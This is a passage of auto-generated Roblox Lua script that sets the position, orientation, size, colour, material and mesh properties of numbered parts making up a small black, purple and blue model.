Part219.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part219.brickColor = BrickColor.new("Really black")
SpecialMesh220.Parent = Part219
SpecialMesh220.Scale = Vector3.new(0.395000011, 0.75, 0.25)
SpecialMesh220.MeshType = Enum.MeshType.Wedge
Part221.Parent = Model0
Part221.CFrame = CFrame.new(-0.609442294, 2.87052941, -14.5920582, -0.999985635, 0.00510674296, -0.00162775011, -0.00513667427, -0.999807417, 0.0189472083, -0.00153067766, 0.0189552978, 0.999819279)
Part221.Orientation = Vector3.new(-1.09000003, -0.0899999961, -179.709991)
Part221.Position = Vector3.new(-0.609442294, 2.87052941, -14.5920582)
Part221.Rotation = Vector3.new(-1.09000003, -0.0899999961, -179.709991)
Part221.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part221.Velocity = Vector3.new(1.17146328e-07, 0.00246564392, 1.53942813e-06)
Part221.Size = Vector3.new(0.275000006, 0.216999978, 0.295375019)
Part221.Anchored = true
Part221.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part221.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part221.BrickColor = BrickColor.new("Really black")
Part221.CanCollide = false
Part221.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part221.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part221.Material = Enum.Material.Glass
Part221.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part221.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part221.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part221.brickColor = BrickColor.new("Really black")
SpecialMesh222.Parent = Part221
SpecialMesh222.Scale = Vector3.new(0.5, 0.75, 0.25)
SpecialMesh222.MeshType = Enum.MeshType.Wedge
Part223.Parent = Model0
Part223.CFrame = CFrame.new(-0.609190822, 2.76472902, -14.4025202, -0.999985635, 0.00510674296, -0.00162775011, -0.00513667427, -0.999807417, 0.0189472083, -0.00153067766, 0.0189552978, 0.999819279)
Part223.Orientation = Vector3.new(-1.09000003, -0.0899999961, -179.709991)
Part223.Position = Vector3.new(-0.609190822, 2.76472902, -14.4025202)
Part223.Rotation = Vector3.new(-1.09000003, -0.0899999961, -179.709991)
Part223.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part223.Velocity = Vector3.new(1.3392264e-07, 0.0024660388, 1.7598868e-06)
Part223.Size = Vector3.new(0.275000006, 0.23299998, 0.295375019)
Part223.Anchored = true
Part223.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part223.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part223.BrickColor = BrickColor.new("Really black")
Part223.CanCollide = false
Part223.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part223.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part223.Material = Enum.Material.Glass
Part223.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part223.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part223.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part223.brickColor = BrickColor.new("Really black")
SpecialMesh224.Parent = Part223
SpecialMesh224.Scale = Vector3.new(0.5, 1, 0.25)
SpecialMesh224.MeshType = Enum.MeshType.Wedge
Part225.Parent = Model0
Part225.CFrame = CFrame.new(-0.610054374, 2.83367729, -14.0694036, 0.999985635, 0.00162807188, -0.00510671316, 0.00513664866, -0.0189460143, 0.999807417, 0.00153100595, -0.999819279, -0.0189541057)
Part225.Orientation = Vector3.new(-88.8799973, -164.919998, 164.830002)
Part225.Position = Vector3.new(-0.610054374, 2.83367729, -14.0694036)
Part225.Rotation = Vector3.new(-91.0899963, -0.289999992, -0.0899999961)
Part225.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part225.Velocity = Vector3.new(1.22989817e-07, 0.00246673287, 1.61621767e-06)
Part225.Size = Vector3.new(0.275000006, 0.311124951, 0.267374992)
Part225.Anchored = true
Part225.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part225.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part225.BrickColor = BrickColor.new("Really black")
Part225.CanCollide = false
Part225.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part225.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part225.Material = Enum.Material.Metal
Part225.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part225.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part225.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part225.brickColor = BrickColor.new("Really black")
SpecialMesh226.Parent = Part225
SpecialMesh226.Scale = Vector3.new(0.495000005, 1, 1)
SpecialMesh226.MeshType = Enum.MeshType.Brick
Part227.Parent = Model0
Part227.CFrame = CFrame.new(-0.611247957, 3.01424932, -13.8955402, 0.999985635, -0.00162807154, 0.00510659395, 0.00513652945, 0.0189459547, -0.999807417, 0.00153100828, 0.999819279, 0.0189540461)
Part227.Orientation = Vector3.new(88.8799973, 15.0799999, 15.1700001)
Part227.Position = Vector3.new(-0.611247957, 3.01424932, -13.8955402)
Part227.Rotation = Vector3.new(88.909996, 0.289999992, 0.0899999961)
Part227.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part227.Velocity = Vector3.new(9.43572971e-08, 0.00246709492, 1.23995574e-06)
Part227.Size = Vector3.new(0.275000006, 0.228, 0.213375002)
Part227.Anchored = true
Part227.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part227.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part227.BrickColor = BrickColor.new("Really black")
Part227.CanCollide = false
Part227.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part227.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part227.Material = Enum.Material.Metal
Part227.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part227.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part227.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part227.brickColor = BrickColor.new("Really black")
SpecialMesh228.Parent = Part227
SpecialMesh228.Scale = Vector3.new(0.569999993, 0.125, 0.375)
SpecialMesh228.MeshType = Enum.MeshType.Wedge
Part229.Parent = Model0
Part229.CFrame = CFrame.new(-0.614671409, 3.24594569, -12.4355726, -0.999985635, -0.00162807154, -0.00510656228, -0.00513649778, 0.0189459547, 0.999807417, -0.00153100886, 0.999819279, -0.0189540461)
Part229.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part229.Position = Vector3.new(-0.614671409, 3.24594569, -12.4355726)
Part229.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part229.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part229.Velocity = Vector3.new(5.76182231e-08, 0.00247013662, 7.57164685e-07)
Part229.Size = Vector3.new(0.275000006, 0.745124936, 0.280375004)
Part229.Anchored = true
Part229.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part229.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part229.BrickColor = BrickColor.new("Really black")
Part229.CanCollide = false
Part229.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part229.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part229.Material = Enum.Material.Metal
Part229.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part229.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part229.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part229.brickColor = BrickColor.new("Really black")
SpecialMesh230.Parent = Part229
SpecialMesh230.Scale = Vector3.new(0.400000006, 1.04999995, 0.5)
SpecialMesh230.MeshType = Enum.MeshType.Brick
Part231.Parent = Model0
Part231.CFrame = CFrame.new(-0.610754132, 2.89412951, -13.8151274, -0.999985635, -0.00162807154, -0.00510650687, -0.00513644237, 0.0189459547, 0.999807417, -0.00153100991, 0.999819279, -0.0189540461)
Part231.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part231.Position = Vector3.new(-0.610754132, 2.89412951, -13.8151274)
Part231.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part231.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part231.Velocity = Vector3.new(1.1340417e-07, 0.00246726256, 1.49025209e-06)
Part231.Size = Vector3.new(0.275000006, 0.200000003, 0.303375006)
Part231.Anchored = true
Part231.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part231.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part231.BrickColor = BrickColor.new("Really black")
Part231.CanCollide = false
Part231.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part231.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part231.Material = Enum.Material.Glass
Part231.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part231.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part231.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part231.brickColor = BrickColor.new("Really black")
SpecialMesh232.Parent = Part231
SpecialMesh232.Scale = Vector3.new(0.524999976, 0.5, 0.5)
SpecialMesh232.MeshType = Enum.MeshType.Wedge
Part233.Parent = Model0
Part233.CFrame = CFrame.new(-0.614374042, 3.38457584, -13.09618, 0.999985635, -0.00162795233, 0.00510671316, 0.00513664633, 0.0189459547, -0.999807417, 0.00153088674, 0.999819279, 0.0189540461)
Part233.Orientation = Vector3.new(88.8799973, 15.0799999, 15.1700001)
Part233.Position = Vector3.new(-0.614374042, 3.38457584, -13.09618)
Part233.Rotation = Vector3.new(88.909996, 0.289999992, 0.0899999961)
Part233.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part233.Velocity = Vector3.new(3.56362335e-08, 0.00246876013, 4.68297941e-07)
Part233.Size = Vector3.new(0.275000006, 0.322125077, 0.363375008)
Part233.Anchored = true
Part233.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part233.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part233.BrickColor = BrickColor.new("Really black")
Part233.CanCollide = false
Part233.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part233.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part233.Material = Enum.Material.Metal
Part233.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part233.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part233.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part233.brickColor = BrickColor.new("Really black")
SpecialMesh234.Parent = Part233
SpecialMesh234.Scale = Vector3.new(0.5, 1, 1)
SpecialMesh234.MeshType = Enum.MeshType.Wedge
Part235.Parent = Model0
Part235.CFrame = CFrame.new(-0.612951875, 3.3556869, -13.9274721, 0.999985635, 0.00162774313, -0.00510693667, 0.00513686566, -0.0189458374, 0.999807417, 0.00153067405, -0.999819279, -0.0189539269)
Part235.Orientation = Vector3.new(-88.8799973, -164.919998, 164.830002)
Part235.Position = Vector3.new(-0.612951875, 3.3556869, -13.9274721)
Part235.Rotation = Vector3.new(-91.0899963, -0.289999992, -0.0899999961)
Part235.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part235.Velocity = Vector3.new(4.02170173e-08, 0.0024670281, 5.28494468e-07)
Part235.Size = Vector3.new(0.275000006, 0.54112494, 0.367374986)
Part235.Anchored = true
Part235.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part235.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part235.BrickColor = BrickColor.new("Really black")
Part235.CanCollide = false
Part235.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part235.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part235.Material = Enum.Material.Metal
Part235.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part235.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part235.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part235.brickColor = BrickColor.new("Really black")
SpecialMesh236.Parent = Part235
SpecialMesh236.Scale = Vector3.new(0.5, 1.04999995, 0.600000024)
SpecialMesh236.MeshType = Enum.MeshType.Brick
Part237.Parent = Model0
Part237.CFrame = CFrame.new(-0.611452341, 3.03449631, -13.8299093, 0.999985635, 0.00162795268, -0.00510686403, 0.0051367972, -0.0189460143, 0.999807417, 0.00153088395, -0.999819279, -0.0189541057)
Part237.Orientation = Vector3.new(-88.8799973, -164.919998, 164.830002)
Part237.Position = Vector3.new(-0.611452341, 3.03449631, -13.8299093)
Part237.Rotation = Vector3.new(-91.0899963, -0.289999992, -0.0899999961)
Part237.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part237.Velocity = Vector3.new(9.11468163e-08, 0.00246723159, 1.19776655e-06)
Part237.Size = Vector3.new(0.275000006, 0.207000002, 0.303375006)
Part237.Anchored = true
Part237.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part237.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part237.BrickColor = BrickColor.new("Really black")
Part237.CanCollide = false
Part237.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part237.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part237.Material = Enum.Material.Metal
Part237.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part237.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part237.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part237.brickColor = BrickColor.new("Really black")
SpecialMesh238.Parent = Part237
SpecialMesh238.Scale = Vector3.new(0.5, 0.5, 0.5)
SpecialMesh238.MeshType = Enum.MeshType.Wedge
Part239.Parent = Model0
Part239.CFrame = CFrame.new(-0.608695984, 3.30580091, -16.5400867, 0.999985635, -0.00133592135, 0.00519114826, 0.0051369979, -0.0377659909, -0.999273479, 0.00153099943, 0.999285758, -0.0377585851)
Part239.Orientation = Vector3.new(87.8199997, 172.169998, 172.25)
Part239.Position = Vector3.new(-0.608695984, 3.30580091, -16.5400867)
Part239.Rotation = Vector3.new(92.159996, 0.299999982, 0.0799999982)
Part239.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part239.Velocity = Vector3.new(4.81271911e-08, 0.00246158475, 6.32443061e-07)
Part239.Size = Vector3.new(0.275000006, 1.65712488, 0.422374964)
Part239.Anchored = true
Part239.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part239.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part239.BrickColor = BrickColor.new("Really black")
Part239.CanCollide = false
Part239.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part239.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part239.Material = Enum.Material.Metal
Part239.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part239.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part239.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part239.brickColor = BrickColor.new("Really black")
SpecialMesh240.Parent = Part239
SpecialMesh240.Scale = Vector3.new(0.400000006, 1, 0.5)
SpecialMesh240.MeshType = Enum.MeshType.Brick
Part241.Parent = Model0
Part241.CFrame = CFrame.new(-0.607766628, 3.58790874, -18.0936966, 0.999985635, -0.0010395617, 0.00525854016, 0.00513699278, -0.0943568796, -0.99552542, 0.00153108896, 0.995537996, -0.094350189)
Part241.Orientation = Vector3.new(84.5800018, 176.809998, 176.87999)
Part241.Position = Vector3.new(-0.607766628, 3.58790874, -18.0936966)
Part241.Rotation = Vector3.new(95.409996, 0.299999982, 0.0599999987)
Part241.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part241.Velocity = Vector3.new(3.39455752e-09, 0.00245834771, 4.46085551e-08)
Part241.Size = Vector3.new(0.275000006, 1.66212487, 0.359375)
Part241.Anchored = true
Part241.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part241.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part241.BrickColor = BrickColor.new("Really black")
Part241.CanCollide = false
Part241.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part241.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part241.Material = Enum.Material.Metal
Part241.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part241.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part241.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part241.brickColor = BrickColor.new("Really black")
SpecialMesh242.Parent = Part241
SpecialMesh242.Scale = Vector3.new(0.400000006, 1, 0.5)
SpecialMesh242.MeshType = Enum.MeshType.Brick
Part243.Parent = Model0
Part243.CFrame = CFrame.new(-0.618630528, 3.29811025, -11.1170893, -0.999985635, -0.00162795233, -0.0051068007, -0.00513673387, 0.0189459547, 0.999807417, -0.00153088511, 0.999819279, -0.0189540461)
Part243.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part243.Position = Vector3.new(-0.618630528, 3.29811025, -11.1170893)
Part243.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part243.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part243.Velocity = Vector3.new(4.93467311e-08, 0.00247288332, 6.48468244e-07)
Part243.Size = Vector3.new(0.25999999, 0.3125, 0.320125014)
Part243.Anchored = true
Part243.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part243.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part243.BrickColor = BrickColor.new("Really black")
Part243.CanCollide = false
Part243.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part243.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part243.Material = Enum.Material.Metal
Part243.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part243.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part243.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part243.brickColor = BrickColor.new("Really black")
SpecialMesh244.Parent = Part243
SpecialMesh244.Scale = Vector3.new(0.5, 1, 1)
SpecialMesh244.MeshType = Enum.MeshType.Wedge
Part245.Parent = Model0
Part245.CFrame = CFrame.new(-0.639055848, 2.33898354, -13.8797112, 0.0028942409, -0.999985635, -0.00451144017, -0.277069569, -0.00513673481, 0.960836232, -0.960845649, -0.00153090828, -0.277080446)
Part245.Orientation = Vector3.new(-73.909996, -179.069992, -91.0599976)
Part245.Position = Vector3.new(-0.639055848, 2.33898354, -13.8797112)
Part245.Rotation = Vector3.new(-106.089996, -0.25999999, 89.8299942)
Part245.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part245.Velocity = Vector3.new(2.01431277e-07, 0.00246712356, 2.64702226e-06)
Part245.Size = Vector3.new(0.453000009, 0.200000003, 0.280375004)
Part245.Anchored = true
Part245.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part245.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part245.BrickColor = BrickColor.new("Royal purple")
Part245.CanCollide = false
Part245.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part245.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part245.Material = Enum.Material.Neon
Part245.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part245.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part245.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part245.brickColor = BrickColor.new("Royal purple")
SpecialMesh246.Parent = Part245
SpecialMesh246.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh246.MeshType = Enum.MeshType.Wedge
Part247.Parent = Model0
Part247.CFrame = CFrame.new(-0.611137211, 3.24560308, -14.7434616, 0.999985635, -0.00162807363, 0.00510707032, 0.00513700629, 0.018946372, -0.999807417, 0.0015309992, 0.999819279, 0.0189544633)
Part247.Orientation = Vector3.new(88.8799973, 15.0799999, 15.1700001)
Part247.Position = Vector3.new(-0.611137211, 3.24560308, -14.7434616)
Part247.Rotation = Vector3.new(88.909996, 0.289999992, 0.0899999961)
Part247.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part247.Velocity = Vector3.new(5.76725228e-08, 0.0024653282, 7.57878638e-07)
Part247.Size = Vector3.new(0.275000006, 0.488124937, 0.418375015)
Part247.Anchored = true
Part247.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part247.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part247.BrickColor = BrickColor.new("Really black")
Part247.CanCollide = false
Part247.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part247.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part247.Material = Enum.Material.Metal
Part247.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part247.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part247.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part247.brickColor = BrickColor.new("Really black")
SpecialMesh248.Parent = Part247
SpecialMesh248.Scale = Vector3.new(0.400000006, 1, 0.899999976)
SpecialMesh248.MeshType = Enum.MeshType.Brick
Part249.Parent = Model0
Part249.CFrame = CFrame.new(-0.646988273, 3.68078995, -13.1990242, 0.00245985761, -0.999985635, 0.00476197852, -0.693573356, -0.00513654156, -0.720367849, 0.720381916, -0.00153077836, -0.693576097)
Part249.Orientation = Vector3.new(46.079998, 179.610001, -90.4199982)
Part249.Position = Vector3.new(-0.646988273, 3.68078995, -13.1990242)
Part249.Rotation = Vector3.new(133.910004, 0.269999981, 89.8600006)
Part249.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part249.Velocity = Vector3.new(-1.13331566e-08, 0.00246854057, -1.48930098e-07)
Part249.Size = Vector3.new(0.496000022, 0.200000003, 0.280375004)
Part249.Anchored = true
Part249.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part249.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part249.BrickColor = BrickColor.new("Royal purple")
Part249.CanCollide = false
Part249.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part249.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part249.Material = Enum.Material.Neon
Part249.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part249.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part249.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part249.brickColor = BrickColor.new("Royal purple")
SpecialMesh250.Parent = Part249
SpecialMesh250.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh250.MeshType = Enum.MeshType.Wedge
Part251.Parent = Model0
Part251.CFrame = CFrame.new(-0.616084397, 3.20240736, -11.3666525, -0.999985635, -0.000716604234, -0.00531162601, -0.00513642887, -0.154956639, 0.987908065, -0.00153101014, 0.987921119, 0.154950723)
Part251.Orientation = Vector3.new(-81.0800018, -1.95999992, -178.099991)
Part251.Position = Vector3.new(-0.616084397, 3.20240736, -11.3666525)
Part251.Rotation = Vector3.new(-81.0899963, -0.299999982, 179.959991)
Part251.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part251.Velocity = Vector3.new(6.45219203e-08, 0.00247236365, 8.47886554e-07)
Part251.Size = Vector3.new(0.275000006, 0.203125, 0.234375)
Part251.Anchored = true
Part251.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part251.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part251.BrickColor = BrickColor.new("Really black")
Part251.CanCollide = false
Part251.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part251.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part251.Material = Enum.Material.Metal
Part251.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part251.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part251.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part251.brickColor = BrickColor.new("Really black")
SpecialMesh252.Parent = Part251
SpecialMesh252.Scale = Vector3.new(0.5, 1.04999995, 0.400000006)
SpecialMesh252.MeshType = Enum.MeshType.Brick
Part253.Parent = Model0
Part253.CFrame = CFrame.new(-0.616027236, 3.22281599, -11.4724684, -0.999985635, -0.00162807154, -0.00510656228, -0.00513649778, 0.0189459547, 0.999807417, -0.00153100886, 0.999819279, -0.0189540461)
Part253.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part253.Position = Vector3.new(-0.616027236, 3.22281599, -11.4724684)
Part253.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part253.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part253.Velocity = Vector3.new(6.12858102e-08, 0.00247214315, 8.05360628e-07)
Part253.Size = Vector3.new(0.275000006, 0.415125012, 0.234375)
Part253.Anchored = true
Part253.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part253.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part253.BrickColor = BrickColor.new("Really black")
Part253.CanCollide = false
Part253.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part253.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part253.Material = Enum.Material.Metal
Part253.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part253.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part253.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part253.brickColor = BrickColor.new("Really black")
SpecialMesh254.Parent = Part253
SpecialMesh254.Scale = Vector3.new(0.5, 1.04999995, 0.400000006)
SpecialMesh254.MeshType = Enum.MeshType.Brick
Part255.Parent = Model0
Part255.CFrame = CFrame.new(-0.610752404, 3.28331137, -15.1213608, 0.999985635, -0.00347625092, 0.00408016983, 0.00513697462, 0.404109061, -0.914696634, 0.00153088057, 0.914704442, 0.404121131)
Part255.Orientation = Vector3.new(66.159996, 0.579999983, 0.729999959)
Part255.Position = Vector3.new(-0.610752404, 3.28331137, -15.1213608)
Part255.Rotation = Vector3.new(66.159996, 0.229999989, 0.199999988)
Part255.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part255.Velocity = Vector3.new(5.16932808e-08, 0.00246454077, 6.79305003e-07)
Part255.Size = Vector3.new(0.275000006, 0.330124885, 0.214375019)
Part255.Anchored = true
Part255.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part255.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part255.BrickColor = BrickColor.new("Bright blue")
Part255.CanCollide = false
Part255.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part255.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part255.Material = Enum.Material.Neon
Part255.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part255.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part255.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part255.brickColor = BrickColor.new("Bright blue")
SpecialMesh256.Parent = Part255
SpecialMesh256.Scale = Vector3.new(0.449999988, 1, 0.100000001)
SpecialMesh256.MeshType = Enum.MeshType.Brick
Part257.Parent = Model0
Part257.CFrame = CFrame.new(-0.63657546, 3.38894939, -19.0216789, -0.00237622252, -0.999985635, -0.00480452133, 0.680895686, -0.00513668498, 0.732362568, -0.732376754, -0.00153112097, 0.68089813)
Part257.Orientation = Vector3.new(-47.079998, -0.399999976, 90.4300003)
Part257.Position = Vector3.new(-0.63657546, 3.38894939, -19.0216789)
Part257.Rotation = Vector3.new(-47.0900002, -0.280000001, 90.1399994)
Part257.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part257.Velocity = Vector3.new(3.49426692e-08, 0.00245640939, 4.59184662e-07)
Part257.Size = Vector3.new(0.940000057, 0.200000003, 0.285374999)
Part257.Anchored = true
Part257.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part257.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part257.BrickColor = BrickColor.new("Royal purple")
Part257.CanCollide = false
Part257.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part257.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part257.Material = Enum.Material.Neon
Part257.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part257.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part257.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part257.brickColor = BrickColor.new("Royal purple")
SpecialMesh258.Parent = Part257
SpecialMesh258.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh258.MeshType = Enum.MeshType.Wedge
Part259.Parent = Model0
Part259.CFrame = CFrame.new(-0.584489346, 3.6811111, -13.1989288, -0.00245976867, 0.999985635, 0.00476201251, 0.693573415, 0.00513650384, -0.720367789, -0.720381916, 0.00153086672, -0.693576038)
Part259.Orientation = Vector3.new(46.079998, 179.610001, 89.5799942)
Part259.Position = Vector3.new(-0.584489346, 3.6811111, -13.1989288)
Part259.Rotation = Vector3.new(133.910004, 0.269999981, -90.1399994)
Part259.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part259.Velocity = Vector3.new(-1.13840777e-08, 0.00246855081, -1.49599259e-07)
Part259.Size = Vector3.new(0.496000022, 0.200000003, 0.280375004)
Part259.Anchored = true
Part259.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part259.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part259.BrickColor = BrickColor.new("Royal purple")
Part259.CanCollide = false
Part259.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part259.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part259.Material = Enum.Material.Neon
Part259.RightSurface = Enum.SurfaceType.SmoothNoOutlines
